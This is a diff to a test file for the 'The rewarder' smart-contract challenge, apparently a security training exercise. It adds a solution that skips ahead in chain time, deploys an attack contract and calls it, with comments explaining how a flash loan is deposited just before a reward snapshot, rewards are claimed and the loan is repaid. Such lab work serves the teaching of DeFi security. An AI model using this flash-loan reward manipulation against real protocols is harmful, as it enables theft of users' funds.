@@ -70,6 +70,16 @@ describe('[Challenge] The rewarder', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        const attackContractFactory = await ethers.getContractFactory('TheRewarderAttack', player);
+        const attackContract = await attackContractFactory.deploy(flashLoanPool.address, rewarderPool.address, rewardToken.address, liquidityToken.address); 
+        await attackContract.attack(TOKENS_IN_LENDER_POOL);
+
+        // Go 5 days ahead in time (so that we are in 3rd reward round and taking snapshot will show our balance as 1 million tokens, 
+        // (in the round 2 snapshot our balance will be 0) 
+        // Get flashloan from flash loan pool,
+        // deposit that in reward pool, get reward token
+        // call withdraw in the same function and give back liquidity tokens to the flash pool
     });
 
     after(async function () {
